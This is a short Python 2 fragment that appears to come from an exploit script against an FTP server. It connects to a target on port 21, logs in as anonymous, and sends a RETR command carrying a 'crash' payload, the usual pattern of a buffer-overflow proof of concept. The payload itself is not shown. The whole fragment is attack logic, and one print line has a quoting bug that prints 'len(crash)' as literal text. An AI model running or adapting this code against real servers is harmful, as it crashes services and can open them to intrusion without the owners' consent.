s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((target, 21))
except:
	print "[-] Connection to " + target + " failed!"
	sys.exit(0)

print "[*] Sending " + 'len(crash)' + " " + command + " byte crash..."

s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send("RETR" + " " + crash + "\r\n")
time.sleep(4)